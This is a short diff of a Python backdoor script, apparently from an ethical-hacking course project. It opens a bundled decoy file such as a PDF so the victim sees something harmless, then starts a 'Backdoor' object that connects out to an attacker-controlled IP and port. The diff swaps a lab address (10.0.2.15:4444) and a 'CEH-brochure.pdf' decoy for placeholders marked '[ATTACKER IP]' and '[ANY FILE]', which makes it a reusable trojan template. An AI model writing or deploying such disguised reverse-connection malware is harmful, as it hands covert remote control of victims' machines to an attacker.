@@ -92,11 +92,11 @@ class Backdoor:
 
 
 if hasattr(sys, '_MEIPASS'):
-    filename = sys._MEIPASS + "\\CEH-brochure.pdf"
+    filename = sys._MEIPASS + "[ANY FILE (.pdf/.jpg/.mp3)]"
     subprocess.Popen(filename, shell=True)
 
 try:
-    cykitbackdoor = Backdoor("10.0.2.15", 4444)
+    cykitbackdoor = Backdoor("[ATTACKER IP]", [ATTACKER PORT])
     cykitbackdoor.run()
 except Exception:
     sys.exit()
